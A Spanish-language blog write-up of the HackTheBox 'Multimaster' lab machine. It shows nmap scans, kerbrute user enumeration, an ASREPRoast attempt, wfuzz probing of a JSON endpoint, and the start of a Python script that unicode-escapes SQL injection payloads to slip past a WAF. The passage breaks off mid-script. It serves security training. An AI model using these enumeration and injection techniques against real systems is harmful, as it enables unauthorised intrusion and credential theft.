@@ -1,0 +1,1573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Maquina - Multimaster | Firtsmiracle blog</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina - Multimaster | Firtsmiracle blog</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina - Multimaster" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hola de nuevo el de hoy vamos a estar resolviendo la maquina Multimaster de hackthebox que es una maquina Windows de dificultad Insane, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por smb, despues usaremos wfuzz para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una sql injection avanzada para hacer bypass un waf incorporado en la maquina, obtendremos los RID Y SID de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de Visual Studio Code que por medio de la exposicion debugger lograremos obtener RCE, finalmente usaremos BoodHound donde setearemos kerberos dont require preauthetication a un usuario miembro del grupo Server Operators y manipulando el binPath nos convertiremos en el usuario Administrator." />
+<meta property="og:description" content="Hola de nuevo el de hoy vamos a estar resolviendo la maquina Multimaster de hackthebox que es una maquina Windows de dificultad Insane, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por smb, despues usaremos wfuzz para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una sql injection avanzada para hacer bypass un waf incorporado en la maquina, obtendremos los RID Y SID de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de Visual Studio Code que por medio de la exposicion debugger lograremos obtener RCE, finalmente usaremos BoodHound donde setearemos kerberos dont require preauthetication a un usuario miembro del grupo Server Operators y manipulando el binPath nos convertiremos en el usuario Administrator." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Multimaster" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Multimaster" />
+<meta property="og:site_name" content="Firtsmiracle blog" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Multimaster/multimaster_logo.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-24T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Multimaster/multimaster_logo.png" />
+<meta property="twitter:title" content="Maquina - Multimaster" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-03-24T00:00:00+00:00","datePublished":"2023-03-24T00:00:00+00:00","description":"Hola de nuevo el de hoy vamos a estar resolviendo la maquina Multimaster de hackthebox que es una maquina Windows de dificultad Insane, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por smb, despues usaremos wfuzz para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una sql injection avanzada para hacer bypass un waf incorporado en la maquina, obtendremos los RID Y SID de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de Visual Studio Code que por medio de la exposicion debugger lograremos obtener RCE, finalmente usaremos BoodHound donde setearemos kerberos dont require preauthetication a un usuario miembro del grupo Server Operators y manipulando el binPath nos convertiremos en el usuario Administrator.","headline":"Maquina - Multimaster","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Multimaster/multimaster_logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Multimaster"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Multimaster"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Informacion</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina - Multimaster</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-03-24">24 Mar 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Multimaster/multimaster_logo.png" alt="Maquina - Multimaster">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hola de nuevo el de hoy vamos a estar resolviendo la maquina <code>Multimaster</code> de <code>hackthebox</code> que es una maquina <code>Windows</code> de dificultad <code>Insane</code>, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por <code>smb</code>, despues usaremos <code>wfuzz</code> para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una <code>sql injection</code> avanzada para hacer bypass un <code>waf</code> incorporado en la maquina, obtendremos los <code>RID Y SID</code> de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de <code>Visual Studio Code</code> que por medio de la exposicion <code>debugger</code> lograremos obtener <code>RCE</code>, finalmente usaremos BoodHound donde setearemos <code>kerberos dont require preauthetication</code> a un usuario miembro del grupo <code>Server Operators</code> y manipulando el binPath nos convertiremos en el usuario Administrator.</p>
+
+<p>Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Multimaster
+❯ ls
+ Multimaster
+</code></pre>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,scripts}
+}
+❯ mkt
+❯ ls
+ content   nmap   scripts
+</code></pre>
+
+<h2 id="enumeración">Enumeración <a href="#enumeración">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.179
+PING 10.10.10.179 (10.10.10.179) 56(84) bytes of data.
+64 bytes from 10.10.10.179: icmp_seq=1 ttl=127 time=117 ms
+
+--- 10.10.10.179 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 116.535/116.535/116.535/0.000 ms
+</code></pre>
+<p>Vemos que recibimos respuesta y que el ttl es igual a 127 correspondiente a una maquina windowns, seguidamente procederemos a el scaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.179 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 15:32 GMT
+Initiating SYN Stealth Scan at 15:32
+Scanning 10.10.10.179 [65535 ports]
+Discovered open port 135/tcp on 10.10.10.179
+Discovered open port 53/tcp on 10.10.10.179
+Discovered open port 445/tcp on 10.10.10.179
+Discovered open port 3389/tcp on 10.10.10.179
+Discovered open port 80/tcp on 10.10.10.179
+Discovered open port 139/tcp on 10.10.10.179
+Discovered open port 3269/tcp on 10.10.10.179
+Discovered open port 389/tcp on 10.10.10.179
+Discovered open port 9389/tcp on 10.10.10.179
+Discovered open port 49698/tcp on 10.10.10.179
+Discovered open port 49667/tcp on 10.10.10.179
+Discovered open port 3268/tcp on 10.10.10.179
+Discovered open port 49675/tcp on 10.10.10.179
+Discovered open port 49674/tcp on 10.10.10.179
+Discovered open port 49681/tcp on 10.10.10.179
+Discovered open port 88/tcp on 10.10.10.179
+Discovered open port 5985/tcp on 10.10.10.179
+Discovered open port 593/tcp on 10.10.10.179
+Discovered open port 49666/tcp on 10.10.10.179
+Discovered open port 636/tcp on 10.10.10.179
+Discovered open port 464/tcp on 10.10.10.179
+Completed SYN Stealth Scan at 15:32, 41.87s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.179
+Host is up, received user-set (0.24s latency).
+Scanned at 2023-03-31 15:32:09 GMT for 41s
+Not shown: 65514 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49674/tcp open  unknown          syn-ack ttl 127
+49675/tcp open  unknown          syn-ack ttl 127
+49681/tcp open  unknown          syn-ack ttl 127
+49698/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 41.95 seconds
+           Raw packets sent: 196589 (8.650MB) | Rcvd: 47 (2.068KB)
+</code></pre>
+<p>Podemos ver puertos interesantes que se encuentran abiertos como <code>135 rpc</code> , <code>139 ldap</code> , <code>445 smb</code> , <code>80 http</code>, 88 <code>Kerberos</code> y <code>5985 winrm</code>, podemos asumir que nos enfrentaremos a un entorno de directorio activo.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49681,49698 10.10.10.179 -oN targets
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 15:35 GMT
+Nmap scan report for 10.10.10.179
+Host is up (0.24s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: MegaCorp
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-31 15:42:39Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
+| Not valid before: 2023-03-30T15:34:28
+|_Not valid after:  2023-09-29T15:34:28
+| rdp-ntlm-info: 
+|   Target_Name: MEGACORP
+|   NetBIOS_Domain_Name: MEGACORP
+|   NetBIOS_Computer_Name: MULTIMASTER
+|   DNS_Domain_Name: MEGACORP.LOCAL
+|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
+|   DNS_Tree_Name: MEGACORP.LOCAL
+|   Product_Version: 10.0.14393
+|_  System_Time: 2023-03-31T15:43:32+00:00
+|_ssl-date: 2023-03-31T15:44:11+00:00; +6m58s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: MULTIMASTER
+|   NetBIOS computer name: MULTIMASTER\x00
+|   Domain name: MEGACORP.LOCAL
+|   Forest name: MEGACORP.LOCAL
+|   FQDN: MULTIMASTER.MEGACORP.LOCAL
+|_  System time: 2023-03-31T08:43:32-07:00
+| smb2-time: 
+|   date: 2023-03-31T15:43:36
+|_  start_date: 2023-03-31T15:34:34
+|_clock-skew: mean: 1h30m58s, deviation: 3h07m50s, median: 6m58s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 106.97 seconds
+</code></pre>
+<p>Visulizamos informacion interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>53</td>
+      <td>DNS</td>
+      <td>Simple DNS Plus</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Microsoft IIS httpd 10.0</td>
+    </tr>
+    <tr>
+      <td>88</td>
+      <td>KERBEROS</td>
+      <td>Microsoft Windows Kerberos</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>RPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td>LDAP</td>
+      <td>Microsoft Windows netbios-ssn</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td>SMB</td>
+      <td>?</td>
+    </tr>
+    <tr>
+      <td>3389</td>
+      <td>RDP</td>
+      <td>Microsoft Terminal Services</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>WINRM</td>
+      <td>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usando la herramienta <code>crackmapexec</code>:</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.179
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+</code></pre>
+<p>Añadimos el domain a nuestro <code>/etc/hosts</code></p>
+
+<pre><code class="language-bash">echo "10.10.10.179 MEGACORP.LOCAL" &gt;&gt; /etc/hosts
+</code></pre>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Buscaremos si podemos listar recursos compartidos, para ello podemos hacer uso de smbmap con los parametros <code>-H</code> para especificar el host y <code>-u</code> para hacer uso de una sesion nula.</p>
+
+<pre><code class="language-bash">❯ smbmap -H 10.10.10.179 -u 'null'
+[!] Authentication error on 10.10.10.179
+</code></pre>
+<p>Vemos que no contamos con acceso por smb , seguidamente probaremos a tratat de enumerar usuarios del sistema por rpc con <code>rpcclient</code> y de igual manera no tenemos acceso.</p>
+
+<pre><code class="language-bash">❯ rpcclient -U "" 10.10.10.179 -N
+rpcclient $&gt; enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $&gt; 
+</code></pre>
+
+<p>Entonces procederemos a abrir la pagina web correspondiente a un <code>IIS</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi1.PNG" alt="" /></p>
+
+<p>Despues de enumerar un rato la pagina web, en la opcion <code>colleague finder</code> realizamos una busqueda que nos reporta una lista de usuarios.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi2.PNG" alt="" /></p>
+
+<pre><code class="language-bash">❯ cat users.txt
+sbauer
+okent
+ckane
+kpage
+shayna
+james
+rmartin
+jorden
+alyx
+ilee
+nbourne
+zpowers
+aldom
+minato
+</code></pre>
+
+<p>Vamos a validar si los usuarios son validos usando la herramienta <code>kerbrute</code></p>
+
+<ul>
+  <li><a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ /opt/kerbrute/kerbrute userenum --dc 10.10.10.179 -d MEGACORP.LOCAL users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 03/31/23 - Ronnie Flathers @ropnop
+
+2023/03/31 18:45:44 &gt;  Using KDC(s):
+2023/03/31 18:45:44 &gt;  	10.10.10.179:88
+
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	ckane@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	okent@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	sbauer@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	rmartin@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	kpage@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	james@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	jorden@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	ilee@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	alyx@MEGACORP.LOCAL
+2023/03/31 18:45:44 &gt;  [+] VALID USERNAME:	zpowers@MEGACORP.LOCAL
+2023/03/31 18:45:45 &gt;  [+] VALID USERNAME:	nbourne@MEGACORP.LOCAL
+2023/03/31 18:45:45 &gt;  [+] VALID USERNAME:	aldom@MEGACORP.LOCAL
+2023/03/31 18:45:45 &gt;  Done! Tested 14 usernames (12 valid) in 0.787 seconds
+</code></pre>
+
+<p>Como nos encontramos en un entorno de directorio activo y es un domain controler, vamos a intentar realizar con los usuarios un <code>ASREPRoast Attack</code>, mediante el cual podemos solicituar un <code>TGT</code> sin conocer las contraseñas de los usuarios para obtener hashes que podemos crackear de forma offline. Para ello usaremos la herramienta de <code>impakcet</code> <code>GetNpUsers.py</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/ropnop/kerbrute">https://github.com/fortra/impacket</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ GetNPUsers.py MEGACORP.LOCAL/ -no-pass -usersfile users.txt
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</code></pre>
+
+<p>Anteriormente veiamos que en <code>Colleague Finder</code> teniamos un input que vamos a proceder a interceptar con <code>burpsite</code> para tratar de causar un error en la consulta.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi4.PNG" alt="" /></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi5.PNG" alt="" /></p>
+
+<p>Cuando añadimos simbolos como la <code>'</code>, nos manda un mensaje de error <code>403</code> Forbidden y con otros simbolos un <code>200</code> ok, asi que vamos a intentar realizar fuerza bruta con <code>wfuzz</code> para entender que esta pasando, para ello usaremos un diccionario del repositorio de <code>danielmiessler</code> llamado <code>special-chars.txt</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Multimaster/multi6.PNG" alt="" /></p>
+
+<pre><code class="language-bash">❯ wfuzz -c -X POST -t 100 -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/json;charset=utf-8' -d '{"name":"FUZZ"}' -u http://10.10.10.179/api/getColleagues
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.179/api/getColleagues
+Total requests: 32
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+000000007:   403        29 L     92 W       1233 Ch     "^"                                                                                                                    
+000000015:   403        29 L     92 W       1233 Ch     "="                                                                                                                    
+000000003:   403        29 L     92 W       1233 Ch     "@"                                                                                                                    
+000000001:   403        29 L     92 W       1233 Ch     "~"                                                                                                                    
+000000016:   403        29 L     92 W       1233 Ch     "{"                                                                                                                    
+000000014:   403        29 L     92 W       1233 Ch     "+"
+</code></pre>
+
+<p>Vemos que al usar muchos hilos en la peticion el servidor nos bloquea por la existencia de un <code>WAF</code>, para ello con usos adicionaremos unos parametros <code>-s 1</code>, para que mande una peticion por segundo y ocultaremos el codigo de estado <code>200</code></p>
+
+<pre><code class="language-bash">❯ wfuzz -c -X POST --hc=200 -s 1 -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/json;charset=utf-8' -d '{"name":"FUZZ"}' -u http://10.10.10.179/api/getColleagues
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.179/api/getColleagues
+Total requests: 32
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+000000004:   403        29 L     92 W       1233 Ch     "#"                                                                                                                    
+000000021:   500        0 L      4 W        36 Ch       "\"                                                                                                                    
+000000028:   403        29 L     92 W       1233 Ch     ":"                                                                                                                    
+000000029:   403        29 L     92 W       1233 Ch     "'"                                                                                                                    
+000000030:   403        29 L     92 W       1233 Ch     """                                                                                                                    
+000000031:   403        29 L     92 W       1233 Ch     "&lt;"                                                                                                                    
+000000032:   403        29 L     92 W       1233 Ch     "&gt;"                                                                                                                    
+
+Total time: 32.39251
+Processed Requests: 32
+Filtered Requests: 25
+Requests/sec.: 0.987882
+</code></pre>
+
+<p>Al finalizar wfuzz nos muestra que la <code>\</code> nos reporta un codigo de estado <code>500 Internal Server Error</code>, que curiosamente usa <code>sqlmap</code> con el nombre de <code>tamper</code> para ofuzcar sus payloads como en el siguente ejemplo.</p>
+
+<pre><code class="language-bash"> &gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')
+    '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'
+</code></pre>
+
+<p>A efectos practicos al mandar la peticion debemos usar <code>\\u00</code> seguido de cada caracter en hexadecimal no es necesario usar tres  <code>\</code> con uno basta.</p>
+
+<p>Para no realizar la peticion una a una o usar sqlmap, vamos a realizarlo manualmente creandonos un script en <code>python3</code>:</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import requests, time, json, signal
+
+def def_handler(sig, frame):
+    print("\n[!] Saliendo...!\n")
+    sys.exit(1)
+
+#ctrl_c -&gt; al presionar nos ejecuta la funcion def_handler
+signal.signal(signal.SIGINT, def_handler)
+
+#global_variables
+main_url = "http://10.10.10.179/api/getColleagues"
+
+
+#recibimos la data como input y la tratamos 
+def recivesql(sqlinyection):
+    sqlmodified = ""
+    for character in sqlinyection:
+        sqlmodified += "\\u00" + hex(ord(character))[2:]
+
+    return sqlmodified
+
+#realizamos la peticion enviando la data tratada y la representamos en formato json
+
+def sendsql(sqlmodified):
+
+    headers = {
+        'Content-Type': 'application/json;charset=utf-8'
+    }
+
